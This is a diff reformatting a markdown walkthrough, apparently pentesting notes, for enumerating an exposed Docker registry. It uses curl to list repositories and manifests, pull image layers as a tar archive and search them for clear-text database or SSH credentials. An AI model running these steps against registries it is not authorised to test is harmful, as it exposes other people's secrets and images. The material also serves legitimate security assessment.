@@ -14,14 +14,24 @@
 
 ## EXAMPLE:
 
-#### 1) curl http://IP_ADDRESS:5000/v2/_catalog (List repositories)
+#### 1) List repositories
 
-#### 2) curl http://IP_ADDRESS:5000/v2/REPOSITORY/tags/list (List manifests)
+    curl http://IP_ADDRESS:5000/v2/_catalog 
 
-#### 3) curl http://IP_ADDRESS:5000/v2/REPOSITORY/manifests/latest (Pull the manifests for the image)
+#### 2) List manifests
+
+    curl http://IP_ADDRESS:5000/v2/REPOSITORY/tags/list 
+
+#### 3) Pull the manifests for the image
+
+    curl http://IP_ADDRESS:5000/v2/REPOSITORY/manifests/latest 
 
 #### On step 3 you can also check for any clear-text credentials for a database or ssh etc.
 
-#### 4) curl -s http://IP_ADDRESS:5000/v2/REPOSITORY/blobs/sha256:HASH -output ARCHIVE.tar (Pull all layers of the image and save them in the form of .tar file)
+#### 4) Pull all layers of the image and save them in the form of .tar file
 
-#### 5) tar -xvf ARCHIVE.tar ( Decompress the file to see the contents )
+    curl -s http://IP_ADDRESS:5000/v2/REPOSITORY/blobs/sha256:HASH -output ARCHIVE.tar 
+
+#### 5) Decompress the file to see the contents
+
+    tar -xvf ARCHIVE.tar 
